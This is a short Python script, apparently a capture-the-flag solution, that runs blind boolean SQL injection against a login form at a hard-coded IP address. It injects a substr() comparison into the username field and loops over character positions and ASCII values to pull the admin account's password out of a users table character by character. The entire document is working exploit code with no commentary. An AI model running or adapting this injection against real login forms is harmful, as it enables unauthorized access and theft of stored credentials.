import requests
import sys

url = 'http://34.148.103.218:4446/fff5bf676ba8796f0c51033403b35311/login'


for i in range(1,40):
    for j in range(32, 127):
        payload = f"amongus' or substr((select Password from users where username='admin'),{i},1)='{chr(j)}' /*"
        data = {"user": payload,"pass": ""}

        r = requests.post(url, data=data)
        
        if "If" in r.text:
            sys.stdout.write(chr(j))
            sys.stdout.flush()
            #print(f"{chr(j)}", end=" ")
            